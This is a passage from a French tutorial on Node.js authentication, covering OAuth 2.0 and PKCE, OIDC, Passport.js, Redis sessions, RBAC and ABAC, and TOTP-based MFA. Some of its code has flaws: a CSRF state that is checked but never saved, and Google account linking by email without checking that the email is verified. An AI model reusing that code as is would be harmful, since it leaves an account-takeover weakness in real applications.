│  Client = l'application qui veut accéder aux ressources         │
│  Auth Server = délivre les tokens après consentement            │
│  Resource Server = API protégée qui vérifie les tokens          │
└─────────────────────────────────────────────────────────────────┘
```

| Acteur | Exemple concret |
|--------|----------------|
| Resource Owner | L'utilisateur avec son compte GitHub |
| Client | Ton application web qui veut accéder au profil GitHub |
| Authorization Server | `github.com/login/oauth` |
| Resource Server | `api.github.com` |

---

## 8. Les Flows OAuth 2.0

### 8.1 Authorization Code Flow (le plus courant)

Le flow standard pour les applications web avec backend.

```
User           Client App         Auth Server      Resource Server
 │                 │                   │                  │
 │ Click "Login    │                   │                  │
 │  with Google"   │                   │                  │
 │────────────────>│                   │                  │
 │                 │ Redirect avec     │                  │
 │                 │ client_id, scope, │                  │
 │                 │ redirect_uri,     │                  │
 │                 │ state, code_verif │                  │
 │                 │──────────────────>│                  │
 │                 │                   │                  │
 │<────────────────────────────────────│                  │
 │  Page de consentement Google        │                  │
 │                                     │                  │
 │ Accepte les permissions             │                  │
 │────────────────────────────────────>│                  │
 │                                     │                  │
 │<────────────────────────────────────│                  │
 │  Redirect vers redirect_uri         │                  │
 │  avec ?code=AUTH_CODE&state=xxx     │                  │
 │                 │                   │                  │
 │────────────────>│                   │                  │
 │  /callback?code │                   │                  │
 │                 │ POST /token       │                  │
 │                 │ code + client_id  │                  │
 │                 │ + client_secret   │                  │
 │                 │ + code_verifier   │                  │
 │                 │──────────────────>│                  │
 │                 │<──────────────────│                  │
 │                 │  access_token     │                  │
 │                 │  refresh_token    │                  │
 │                 │                   │                  │
 │                 │ GET /user (+ token)─────────────────>│
 │                 │<─────────────────────────────────────│
 │                 │  User data        │                  │
```

### 8.2 PKCE — Proof Key for Code Exchange

PKCE (prononcé "pixie") est une extension de sécurité **obligatoire** pour les applications publiques (SPA, mobile) qui ne peuvent pas garder un `client_secret` secret.

```javascript
// pkce.js — Génération du code_verifier et code_challenge
const crypto = require('crypto');

function generateCodeVerifier() {
  // 43-128 caractères, URL-safe
  return crypto.randomBytes(32).toString('base64url');
}

function generateCodeChallenge(verifier) {
  // code_challenge = BASE64URL(SHA256(code_verifier))
  return crypto
    .createHash('sha256')
    .update(verifier)
    .digest('base64url');
}

// Côté client (SPA/mobile) :
const codeVerifier = generateCodeVerifier();
const codeChallenge = generateCodeChallenge(codeVerifier);

// Stocker codeVerifier en sessionStorage (temporairement)
sessionStorage.setItem('pkce_code_verifier', codeVerifier);

// URL d'autorisation
const authUrl = new URL('https://accounts.google.com/o/oauth2/v2/auth');
authUrl.searchParams.set('client_id', CLIENT_ID);
authUrl.searchParams.set('redirect_uri', REDIRECT_URI);
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('scope', 'openid email profile');
authUrl.searchParams.set('code_challenge', codeChallenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
authUrl.searchParams.set('state', crypto.randomBytes(16).toString('hex')); // Anti-CSRF

window.location.href = authUrl.toString();
```

```javascript
// callback — Échanger le code contre des tokens
async function handleCallback(code, state) {
  // Vérifier le state (protection CSRF)
  const savedState = sessionStorage.getItem('oauth_state');
  if (state !== savedState) throw new Error('State mismatch — possible CSRF');

  const codeVerifier = sessionStorage.getItem('pkce_code_verifier');
  sessionStorage.removeItem('pkce_code_verifier');
  sessionStorage.removeItem('oauth_state');

  const response = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: REDIRECT_URI,
      client_id: CLIENT_ID,
      code_verifier: codeVerifier, // Pas de client_secret pour les apps publiques
    }),
  });

  return response.json(); // { access_token, id_token, refresh_token, ... }
}
```

### 8.3 Client Credentials Flow

Pour les communications **machine à machine** (M2M) — pas d'utilisateur impliqué.

```javascript
// client-credentials.js — Obtenir un token pour un service
async function getM2MToken() {
  const response = await fetch('https://auth.monapp.com/oauth/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      client_id: process.env.SERVICE_CLIENT_ID,
      client_secret: process.env.SERVICE_CLIENT_SECRET,
      scope: 'read:analytics write:reports',
    }),
  });

  const { access_token, expires_in } = await response.json();
  
  // Mettre en cache jusqu'à expiration (moins 60 secondes de marge)
  cache.set('m2m_token', access_token, expires_in - 60);
  return access_token;
}
```

### 8.4 Device Flow

Pour les appareils sans navigateur ou clavier limité (TV, IoT).

```
Device                    Auth Server         User Phone
  │                           │                   │
  │ POST /device/code         │                   │
  │──────────────────────────>│                   │
  │<──────────────────────────│                   │
  │  device_code              │                   │
  │  user_code: "ABCD-1234"   │                   │
  │  verification_uri         │                   │
  │  interval: 5              │                   │
  │                           │                   │
  │ Affiche: "Visitez         │                   │
  │  https://app.com/device   │                   │
  │  Entrez le code: ABCD-1234"                   │
  │                           │                   │
  │ Poll /token toutes 5s     │                   │
  │──────────────────────────>│                   │
  │<─── 400 authorization_pending                 │
  │                           │                   │
  │                           │<──────────────────│
  │                           │  User entre code  │
  │                           │  et autorise      │
  │                           │                   │
  │ Poll /token               │                   │
  │──────────────────────────>│                   │
  │<──────────────────────────│                   │
  │  access_token ✅          │                   │
```

---

## 9. OpenID Connect (OIDC)

### 9.1 OAuth 2.0 + Identité = OIDC

OpenID Connect est une couche d'identité construite **par-dessus** OAuth 2.0. Il standardise la façon dont l'identité de l'utilisateur est renvoyée.

```
OAuth 2.0 :  scope=read:profile  →  access_token (opaque)
OIDC :       scope=openid email  →  access_token + id_token (JWT)
```

### 9.2 L'id_token OIDC

```json
// id_token décodé — payload
{
  "iss": "https://accounts.google.com",
  "sub": "110169484474386276334",   // Identifiant unique permanent chez le provider
  "aud": "YOUR_CLIENT_ID.apps.googleusercontent.com",
  "exp": 1735690200,
  "iat": 1735686600,
  "email": "alice@gmail.com",
  "email_verified": true,
  "name": "Alice Dupont",
  "picture": "https://lh3.googleusercontent.com/...",
  "given_name": "Alice",
  "family_name": "Dupont",
  "locale": "fr"
}
```

### 9.3 Scopes OIDC standards

| Scope | Claims retournés |
|-------|-----------------|
| `openid` | `sub` (obligatoire pour OIDC) |
| `profile` | `name`, `given_name`, `family_name`, `picture`, `locale` |
| `email` | `email`, `email_verified` |
| `phone` | `phone_number`, `phone_number_verified` |
| `address` | `address` (objet) |
| `offline_access` | Refresh token |

### 9.4 Endpoint userinfo

Après avoir obtenu un access token OIDC, tu peux récupérer les informations utilisateur :

```javascript
// Récupérer le profil complet depuis l'endpoint userinfo
async function getUserInfo(accessToken) {
  const response = await fetch('https://openidconnect.googleapis.com/v1/userinfo', {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  
  if (!response.ok) {
    throw new Error(`UserInfo error: ${response.status}`);
  }
  
  return response.json();
  // { sub, email, email_verified, name, picture, locale, ... }
}
```

---

## 10. Implémentation OAuth avec Passport.js

### 10.1 Installation

```bash
npm install passport passport-local passport-jwt passport-google-oauth20
npm install express-session connect-mongo
```

### 10.2 Architecture Passport.js

```
Request
   │
   ▼
passport.initialize()  ── Attache passport à req
   │
   ▼
passport.session()     ── Restaure req.user depuis la session (si applicable)
   │
   ▼
passport.authenticate('strategy-name')
   │
   ▼
Strategy.verify(credentials)
   │
   ├── done(null, user)   → req.user = user → next()
   ├── done(null, false)  → 401 Unauthorized
   └── done(error)        → 500 Server Error
```

### 10.3 Configuration Passport complète

```javascript
// src/config/passport.js
const passport = require('passport');
const { Strategy: LocalStrategy } = require('passport-local');
const { Strategy: JwtStrategy, ExtractJwt } = require('passport-jwt');
const { Strategy: GoogleStrategy } = require('passport-google-oauth20');
const User = require('../models/User.model');

// ── Local Strategy (email + password) ──────────────────────────
passport.use('local', new LocalStrategy(
  {
    usernameField: 'email', // Champ dans req.body
    passwordField: 'password',
  },
  async (email, password, done) => {
    try {
      const user = await User.findOne({ email }).select('+password');
      
      if (!user) {
        return done(null, false, { message: 'Email ou mot de passe incorrect' });
      }
      
      const isMatch = await user.comparePassword(password);
      if (!isMatch) {
        return done(null, false, { message: 'Email ou mot de passe incorrect' });
      }
      
      return done(null, user);
    } catch (err) {
      return done(err);
    }
  }
));

// ── JWT Strategy (Authorization: Bearer) ───────────────────────
passport.use('jwt', new JwtStrategy(
  {
    jwtFromRequest: ExtractJwt.fromExtractors([
      // Essayer le cookie d'abord, puis le header Bearer
      (req) => req?.cookies?.access_token,
      ExtractJwt.fromAuthHeaderAsBearerToken(),
    ]),
    secretOrKey: process.env.JWT_ACCESS_SECRET,
    issuer: process.env.APP_URL,
    audience: process.env.APP_URL,
  },
  async (payload, done) => {
    try {
      const user = await User.findById(payload.sub);
      if (!user) {
        return done(null, false);
      }
      return done(null, user);
    } catch (err) {
      return done(err);
    }
  }
));

// ── Google OAuth2 Strategy ──────────────────────────────────────
passport.use('google', new GoogleStrategy(
  {
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: `${process.env.APP_URL}/auth/google/callback`,
    scope: ['openid', 'profile', 'email'],
    passReqToCallback: true, // Pour accéder à req dans le callback
  },
  async (req, accessToken, refreshToken, profile, done) => {
    try {
      // Chercher si l'utilisateur existe déjà avec cet ID Google
      let user = await User.findOne({ 'oauth.google.id': profile.id });
      
      if (!user) {
        // Vérifier si l'email existe déjà (pour lier les comptes)
        user = await User.findOne({ email: profile.emails[0].value });
        
        if (user) {
          // Lier le compte Google au compte existant
          user.oauth = user.oauth || {};
          user.oauth.google = {
            id: profile.id,
            accessToken,
          };
          await user.save();
        } else {
          // Créer un nouvel utilisateur
          user = await User.create({
            email: profile.emails[0].value,
            name: profile.displayName,
            isEmailVerified: profile.emails[0].verified,
            password: require('crypto').randomBytes(32).toString('hex'), // Mot de passe random
            oauth: {
              google: {
                id: profile.id,
                accessToken,
              },
            },
          });
        }
      }
      
      return done(null, user);
    } catch (err) {
      return done(err);
    }
  }
));

// Sérialisation pour les sessions
passport.serializeUser((user, done) => {
  done(null, user._id.toString());
});

passport.deserializeUser(async (id, done) => {
  try {
    const user = await User.findById(id);
    done(null, user);
  } catch (err) {
    done(err);
  }
});

module.exports = passport;
```

### 10.4 Routes OAuth Google

```javascript
// src/routes/auth.routes.js (ajout des routes Google)
const passport = require('../config/passport');

// Initier le flow OAuth Google
router.get('/google',
  passport.authenticate('google', {
    scope: ['openid', 'profile', 'email'],
    // state est géré automatiquement par Passport pour la protection CSRF
    accessType: 'offline',  // Pour recevoir un refresh_token
    prompt: 'select_account', // Toujours afficher la sélection de compte
  })
);

// Callback Google
router.get('/google/callback',
  passport.authenticate('google', {
    session: false, // On gère les tokens manuellement
    failureRedirect: `${process.env.FRONTEND_URL}/login?error=oauth_failed`,
  }),
  async (req, res) => {
    try {
      // req.user est rempli par la strategy Google
      const meta = { userAgent: req.headers['user-agent'], ip: req.ip };
      const { accessToken, refreshToken } = await tokenService.generateTokenPair(
        req.user,
        meta
      );

      res.cookie('access_token', accessToken, {
        ...COOKIE_OPTIONS,
        maxAge: 15 * 60 * 1000,
      });
      res.cookie('refresh_token', refreshToken, REFRESH_COOKIE_OPTIONS);

      // Rediriger vers le frontend
      res.redirect(`${process.env.FRONTEND_URL}/dashboard`);
    } catch (err) {
      res.redirect(`${process.env.FRONTEND_URL}/login?error=server_error`);
    }
  }
);
```

---

## 11. Sessions avec Express et Redis

### 11.1 Pourquoi Redis pour les sessions ?

Par défaut, express-session stocke les sessions en mémoire — elles disparaissent au redémarrage du serveur. Redis est la solution standard pour les sessions persistantes en production.

```bash
npm install express-session connect-redis ioredis
```

```javascript
// src/config/session.js
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const Redis = require('ioredis');

const redisClient = new Redis({
  host: process.env.REDIS_HOST || 'localhost',
  port: parseInt(process.env.REDIS_PORT) || 6379,
  password: process.env.REDIS_PASSWORD,
  retryStrategy: (times) => Math.min(times * 50, 2000), // Reconnexion automatique
});

redisClient.on('error', (err) => console.error('Redis error:', err));
redisClient.on('connect', () => console.log('✅ Redis connecté'));

const sessionConfig = {
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Minimum 32 chars aléatoires
  resave: false,          // Ne pas re-sauvegarder si la session n'a pas changé
  saveUninitialized: false, // Ne pas créer une session pour les visiteurs anonymes
  rolling: true,          // Réinitialiser le TTL à chaque requête authentifiée
  name: '__Host-sid',     // Préfixe __Host- : force secure + path=/ + pas de domain
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000, // 24 heures
  },
  genid: (req) => {
    // Générer un ID de session cryptographiquement sûr
    return require('crypto').randomBytes(32).toString('hex');
  },
};

module.exports = { sessionConfig, redisClient };
```

### 11.2 Sécurisation des sessions

```javascript
// session-security.middleware.js
function sessionSecurity(req, res, next) {
  // Régénérer l'ID de session après login (prévention fixation de session)
  // Appeler après authentification réussie :
  // req.session.regenerate(callback)
  
  // Vérifier l'empreinte de session
  if (req.session.userId) {
    const fingerprint = `${req.headers['user-agent']}|${req.ip}`;
    
    if (req.session.fingerprint && req.session.fingerprint !== fingerprint) {
      // L'empreinte a changé — possible vol de session
      req.session.destroy();
      return res.status(401).json({
        error: 'Session invalide — reconnectez-vous',
      });
    }
    
    req.session.fingerprint = fingerprint;
  }
  
  next();
}

// Dans le handler de login, après authentification :
async function loginHandler(req, res) {
  // ...vérification du mot de passe...
  
  // Régénérer l'ID de session avant de stocker les données (évite la fixation)
  await new Promise((resolve, reject) => {
    req.session.regenerate((err) => err ? reject(err) : resolve());
  });
  
  req.session.userId = user._id.toString();
  req.session.roles = user.roles;
  req.session.fingerprint = `${req.headers['user-agent']}|${req.ip}`;
  
  res.json({ message: 'Connecté', user: user.toJSON() });
}
```

---

## 12. RBAC — Role-Based Access Control

### 12.1 Modèle RBAC

```
Utilisateur → a des Rôles → un Rôle a des Permissions → une Permission protège une Ressource

User Alice → [user, editor]
editor → [read:articles, write:articles, publish:articles]
user   → [read:articles, read:profile, write:profile]

Alice peut :  read:articles ✅  write:articles ✅  publish:articles ✅
Alice ne peut pas : delete:articles ❌  manage:users ❌
```

### 12.2 Implémentation RBAC

```javascript
// src/config/permissions.js
const PERMISSIONS = {
  // Articles
  'read:articles': ['user', 'editor', 'admin'],
  'write:articles': ['editor', 'admin'],
  'publish:articles': ['editor', 'admin'],
  'delete:articles': ['admin'],
  
  // Utilisateurs
  'read:users': ['admin'],
  'manage:users': ['admin'],
  
  // Profil
  'read:profile': ['user', 'editor', 'admin'],
  'write:profile': ['user', 'editor', 'admin'],
  
  // Analytics
  'read:analytics': ['editor', 'admin'],
  'export:analytics': ['admin'],
};

function hasPermission(userRoles, permission) {
  const allowedRoles = PERMISSIONS[permission];
  if (!allowedRoles) {
    console.warn(`Permission inconnue : ${permission}`);
    return false;
  }
  return userRoles.some((role) => allowedRoles.includes(role));
}

module.exports = { PERMISSIONS, hasPermission };
```

```javascript
// src/middlewares/rbac.middleware.js
const { hasPermission } = require('../config/permissions');

// Middleware factory — usage : requirePermission('write:articles')
function requirePermission(permission) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentification requise' });
    }

    const userRoles = req.user.roles || [];

    if (!hasPermission(userRoles, permission)) {
      return res.status(403).json({
        error: 'Permissions insuffisantes',
        required: permission,
        userRoles,
      });
    }

    next();
  };
}

// Middleware factory — usage : requireRole('admin')
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentification requise' });
    }

    const hasRole = roles.some((role) => req.user.roles?.includes(role));

    if (!hasRole) {
      return res.status(403).json({
        error: `Rôle requis : ${roles.join(' ou ')}`,
      });
    }

    next();
  };
}

module.exports = { requirePermission, requireRole };
```

```javascript
// Utilisation dans les routes
const { authenticate } = require('../middlewares/auth.middleware');
const { requirePermission, requireRole } = require('../middlewares/rbac.middleware');

// Route protégée par permission
router.post('/articles',
  authenticate,
  requirePermission('write:articles'),
  async (req, res) => {
    // Seuls les editors et admins arrivent ici
    const article = await Article.create({ ...req.body, author: req.user.sub });
    res.status(201).json(article);
  }
);

// Route admin uniquement
router.delete('/users/:id',
  authenticate,
  requireRole('admin'),
  async (req, res) => {
    await User.findByIdAndDelete(req.params.id);
    res.json({ message: 'Utilisateur supprimé' });
  }
);
```

### 12.3 RBAC hiérarchique

```javascript
// Héritages de rôles — un admin hérite des permissions de editor et user
const ROLE_HIERARCHY = {
  admin: ['editor', 'user'],
  editor: ['user'],
  user: [],
};

function expandRoles(roles) {
  const expanded = new Set(roles);
  
  for (const role of roles) {
    const inherited = ROLE_HIERARCHY[role] || [];
    for (const inheritedRole of inherited) {
      expanded.add(inheritedRole);
      // Récursif si plusieurs niveaux
      for (const deepRole of ROLE_HIERARCHY[inheritedRole] || []) {
        expanded.add(deepRole);
      }
    }
  }
  
  return [...expanded];
}

// Un admin a automatiquement les permissions de editor ET user
// expandRoles(['admin']) → ['admin', 'editor', 'user']
```

---

## 13. ABAC — Attribute-Based Access Control

### 13.1 Les limites du RBAC

RBAC est simple mais rigide. Questions que RBAC ne peut pas répondre facilement :
- "Un utilisateur peut-il modifier **son propre** article mais pas celui des autres ?"
- "Un manager peut-il voir les données uniquement de **son département** ?"
- "Peut-on accéder à cette ressource seulement **entre 9h et 18h** ?"

ABAC répond à ces questions en évaluant des attributs sur le sujet, la ressource et l'environnement.

### 13.2 Implémentation ABAC

```javascript
// src/middlewares/abac.middleware.js

// Politiques ABAC — des fonctions qui retournent true/false
const POLICIES = {
  'article:update': async (subject, resource, environment) => {
    // Condition 1 : l'utilisateur est admin
    if (subject.roles.includes('admin')) return true;
    
    // Condition 2 : l'utilisateur est l'auteur
    if (resource.authorId.toString() === subject.id) return true;
    
    // Condition 3 : l'utilisateur est editor et l'article est dans son département
    if (
      subject.roles.includes('editor') &&
      resource.department === subject.department
    ) return true;
    
    return false;
  },
  
  'article:delete': async (subject, resource, environment) => {
    // Seul l'auteur ou un admin peut supprimer
    if (subject.roles.includes('admin')) return true;
    if (resource.authorId.toString() === subject.id) return true;
    return false;
  },
  
  'data:access': async (subject, resource, environment) => {
    // Restriction horaire : accès uniquement en heures ouvrées
    const hour = environment.currentHour;
    if (hour < 9 || hour > 18) return false;
    
    // Restriction par région
    if (resource.region !== subject.allowedRegion) return false;
    
    return true;
  },
};

// Middleware factory ABAC
function requirePolicy(policyName, getResource) {
  return async (req, res, next) => {
    try {
      const subject = {
        id: req.user.sub,
        roles: req.user.roles,
        department: req.user.department,
        allowedRegion: req.user.allowedRegion,
      };
      
      const resource = await getResource(req);
      
      const environment = {
        currentHour: new Date().getHours(),
        ip: req.ip,
        timestamp: Date.now(),
      };
      
      const policy = POLICIES[policyName];
      if (!policy) {
        return res.status(500).json({ error: `Politique inconnue : ${policyName}` });
      }
      
      const isAllowed = await policy(subject, resource, environment);
      
      if (!isAllowed) {
        return res.status(403).json({ error: 'Accès refusé' });
      }
      
      req.resource = resource; // Attacher la ressource pour la route
      next();
    } catch (err) {
      res.status(500).json({ error: 'Erreur d\'autorisation' });
    }
  };
}

module.exports = { requirePolicy };
```

```javascript
// Utilisation ABAC
router.put('/articles/:id',
  authenticate,
  requirePolicy('article:update', async (req) => {
    return Article.findById(req.params.id);
  }),
  async (req, res) => {
    // req.resource est déjà chargé par le middleware ABAC
    await req.resource.updateOne(req.body);
    res.json({ message: 'Article mis à jour' });
  }
);
```

---

## 14. MFA — Authentification Multi-Facteurs avec TOTP

### 14.1 Comment fonctionne TOTP ?

TOTP (Time-based One-Time Password, RFC 6238) génère un code à 6 chiffres qui change toutes les 30 secondes, basé sur un secret partagé et le temps actuel.

```
Secret partagé (lors de la configuration) :
  Serveur génère → Base32Secret → QR Code → Scanne par Google Authenticator

À chaque connexion :
  Code = HMAC-SHA1(secret, floor(unixtime / 30))
  Les 6 derniers chiffres = code valide pendant 30 secondes
```

### 14.2 Installation et configuration TOTP

```bash
npm install speakeasy qrcode
```

```javascript
// src/services/mfa.service.js
const speakeasy = require('speakeasy');
const qrcode = require('qrcode');
const crypto = require('crypto');
const User = require('../models/User.model');

class MFAService {
  // Étape 1 : Générer le secret et le QR code (initiation)
  async setupMFA(userId) {
    const user = await User.findById(userId);
    if (!user) throw new Error('Utilisateur non trouvé');

    // Générer un secret aléatoire
    const secret = speakeasy.generateSecret({
      name: `MonApp (${user.email})`,  // Nom affiché dans l'app Authenticator
      issuer: 'MonApp',
      length: 20,
    });

    // Stocker le secret temporairement (pas encore activé)
    user.mfaSetupSecret = secret.base32;
    await user.save();

    // Générer le QR code
    const qrCodeDataURL = await qrcode.toDataURL(secret.otpauth_url);

    return {
      secret: secret.base32,      // À afficher en texte pour les apps qui ne scannent pas
      qrCode: qrCodeDataURL,       // Image PNG base64 du QR code
      backupCodes: null,           // Seront générés lors de la confirmation
    };
  }

  // Étape 2 : Confirmer l'activation (l'utilisateur entre son premier code)
  async confirmMFA(userId, token) {
    const user = await User.findById(userId).select('+mfaSetupSecret');
    if (!user?.mfaSetupSecret) throw new Error('Setup MFA non initié');

    const isValid = speakeasy.totp.verify({
      secret: user.mfaSetupSecret,
      encoding: 'base32',
      token,
      window: 1, // Tolérance d'une période (30 secondes avant/après)
    });

    if (!isValid) {
      throw new Error('Code TOTP invalide');
    }

    // Générer les codes de sauvegarde
    const backupCodes = Array.from({ length: 10 }, () =>
      crypto.randomBytes(5).toString('hex').toUpperCase() // Ex: "A1B2C-3D4E5"
    );

    // Hasher les codes de sauvegarde avant stockage
    const hashedBackupCodes = backupCodes.map((code) =>
      crypto.createHash('sha256').update(code).digest('hex')
    );

    // Activer le MFA
    user.mfaEnabled = true;
    user.mfaSecret = user.mfaSetupSecret;
    user.mfaBackupCodes = hashedBackupCodes;
    user.mfaSetupSecret = undefined;
    await user.save();

    return {
      message: 'MFA activé avec succès',
      backupCodes, // Montrer UNE SEULE FOIS — l'utilisateur doit les noter
    };
  }

  // Vérifier un code TOTP lors de la connexion
  async verifyTOTP(userId, token) {
    const user = await User.findById(userId).select('+mfaSecret +mfaBackupCodes');
    if (!user?.mfaEnabled) throw new Error('MFA non activé');

    // Essayer le code TOTP
    const isValidTOTP = speakeasy.totp.verify({
      secret: user.mfaSecret,
      encoding: 'base32',
      token,
      window: 1,
    });

    if (isValidTOTP) return { method: 'totp' };

    // Essayer les codes de sauvegarde
    const hashedInput = crypto.createHash('sha256').update(token.toUpperCase()).digest('hex');
    const backupIndex = user.mfaBackupCodes.indexOf(hashedInput);

    if (backupIndex !== -1) {
      // Consommer le code de sauvegarde (usage unique)
      user.mfaBackupCodes.splice(backupIndex, 1);
      await user.save();
      
      const remaining = user.mfaBackupCodes.length;
      return {
        method: 'backup_code',
        warning: remaining < 3 ? `Il ne reste que ${remaining} codes de sauvegarde` : null,
      };
    }

    throw new Error('Code MFA invalide');
  }

  // Désactiver le MFA
  async disableMFA(userId, password) {
    const user = await User.findById(userId).select('+password');
    
    // Vérifier le mot de passe avant de désactiver
    const isPasswordValid = await user.comparePassword(password);
    if (!isPasswordValid) throw new Error('Mot de passe incorrect');

    user.mfaEnabled = false;
    user.mfaSecret = undefined;
    user.mfaBackupCodes = [];
    await user.save();
  }
}

module.exports = new MFAService();
```

### 14.3 Flow de connexion avec MFA

```javascript
// Connexion en deux étapes avec MFA

// POST /auth/login — Étape 1 : vérifier email/password
router.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email }).select('+password');

  if (!user || !(await user.comparePassword(password))) {
    return res.status(401).json({ error: 'Identifiants invalides' });
  }

  if (user.mfaEnabled) {
    // Émettre un token temporaire de pre-auth (valide 5 minutes)
    const preAuthToken = jwt.sign(
      { sub: user._id, step: 'mfa_required' },
      process.env.JWT_ACCESS_SECRET,
      { expiresIn: '5m' }
    );

    return res.status(200).json({
      mfaRequired: true,
      preAuthToken,
      // Ne pas connecter l'utilisateur encore !
    });
  }

  // Pas de MFA — connexion directe
  const tokens = await tokenService.generateTokenPair(user, req);
  // ...set cookies...
  res.json({ user: user.toJSON() });
});

// POST /auth/mfa/verify — Étape 2 : vérifier le code TOTP
router.post('/mfa/verify', async (req, res) => {
  const { preAuthToken, totpCode } = req.body;

  let preAuthPayload;
  try {
    preAuthPayload = jwt.verify(preAuthToken, process.env.JWT_ACCESS_SECRET);
  } catch {
    return res.status(401).json({ error: 'Token de pre-auth invalide ou expiré' });
  }

  if (preAuthPayload.step !== 'mfa_required') {
    return res.status(400).json({ error: 'Token invalide' });
  }

  try {
    const result = await mfaService.verifyTOTP(preAuthPayload.sub, totpCode);
    const user = await User.findById(preAuthPayload.sub);
    
    const tokens = await tokenService.generateTokenPair(user, {
      userAgent: req.headers['user-agent'],
      ip: req.ip,
    });
    
    // Set cookies...
    res.json({
      user: user.toJSON(),
      mfaMethod: result.method,
      warning: result.warning,
    });
  } catch (err) {
    res.status(401).json({ error: err.message });
  }
});
```

---

## 15. Cas pratique complet — Système d'authentification production

### 15.1 Application Express complète

```javascript
// src/app.js
require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const helmet = require('helmet');
const cors = require('cors');
const mongoose = require('mongoose');
const passport = require('./config/passport');
const { sessionConfig } = require('./config/session');
const session = require('express-session');

const app = express();

// ── Middlewares de sécurité ─────────────────────────────────────
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
}));

app.use(cors({
  origin: process.env.FRONTEND_URL,
  credentials: true, // Nécessaire pour les cookies cross-origin
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
}));

// ── Parsing ─────────────────────────────────────────────────────
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// ── Sessions et Passport ─────────────────────────────────────────
app.use(session(sessionConfig));
app.use(passport.initialize());
app.use(passport.session());

// ── Routes ─────────────────────────────────────────────────────
app.use('/auth', require('./routes/auth.routes'));
app.use('/api/users', require('./routes/user.routes'));

// ── Gestion des erreurs ─────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error(err.stack);
  
  if (err.name === 'ValidationError') {
    return res.status(400).json({ error: err.message });
  }
  
  res.status(500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Erreur serveur interne'
      : err.message,
  });
});

// ── Connexion MongoDB ────────────────────────────────────────────
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('✅ MongoDB connecté'))
  .catch((err) => {
    console.error('❌ MongoDB erreur:', err);
    process.exit(1);
  });

module.exports = app;
```

### 15.2 Routes utilisateur avec RBAC

```javascript
// src/routes/user.routes.js
const express = require('express');
const router = express.Router();
const User = require('../models/User.model');
const { authenticate } = require('../middlewares/auth.middleware');
const { requirePermission, requireRole } = require('../middlewares/rbac.middleware');
const mfaService = require('../services/mfa.service');

// GET /api/users/me — Profil courant
router.get('/me', authenticate, async (req, res) => {
  const user = await User.findById(req.user.sub);
  if (!user) return res.status(404).json({ error: 'Utilisateur non trouvé' });
  res.json(user.toJSON());
});

// PUT /api/users/me — Modifier son profil
router.put('/me', authenticate, async (req, res) => {
  const { name, email } = req.body;
  const allowed = { name, email }; // Whitelist des champs modifiables
  
  // Supprimer les champs undefined
  Object.keys(allowed).forEach((k) => allowed[k] === undefined && delete allowed[k]);
  
  const user = await User.findByIdAndUpdate(req.user.sub, allowed, { new: true });
  res.json(user.toJSON());
});

// GET /api/users — Liste (admin uniquement)
router.get('/',
  authenticate,
  requirePermission('read:users'),
  async (req, res) => {
    const { page = 1, limit = 20, role } = req.query;
    
    const filter = role ? { roles: role } : {};
    const users = await User.find(filter)
      .skip((page - 1) * limit)
      .limit(Number(limit))
      .sort({ createdAt: -1 });
    
    const total = await User.countDocuments(filter);
    
    res.json({
      users: users.map((u) => u.toJSON()),
      pagination: { page: Number(page), limit: Number(limit), total },
    });
  }
);

// POST /api/users/me/mfa/setup — Initier la configuration MFA
router.post('/me/mfa/setup', authenticate, async (req, res) => {
  try {
    const result = await mfaService.setupMFA(req.user.sub);
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// POST /api/users/me/mfa/confirm — Confirmer et activer le MFA
router.post('/me/mfa/confirm', authenticate, async (req, res) => {
  try {
    const { token } = req.body;
    const result = await mfaService.confirmMFA(req.user.sub, token);
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// DELETE /api/users/me/mfa — Désactiver le MFA
router.delete('/me/mfa', authenticate, async (req, res) => {
  try {
    const { password } = req.body;
    await mfaService.disableMFA(req.user.sub, password);
    res.json({ message: 'MFA désactivé' });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

module.exports = router;
```

### 15.3 Variables d'environnement

```bash
# .env — Ne jamais committer ce fichier !
NODE_ENV=development
PORT=3000
APP_URL=http://localhost:3000
FRONTEND_URL=http://localhost:5173

# MongoDB
MONGODB_URI=mongodb://localhost:27017/auth_system

# JWT — Générer avec : node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
JWT_ACCESS_SECRET=abc123...64bytes...hex
JWT_REFRESH_SECRET=def456...64bytes...hex

# Sessions — Générer avec la même méthode
SESSION_SECRET=ghi789...64bytes...hex

# Redis
REDIS_HOST=localhost
REDIS_PORT=6379
REDIS_PASSWORD=

# Cookies
COOKIE_DOMAIN=localhost

# OAuth Google — Obtenir sur console.cloud.google.com
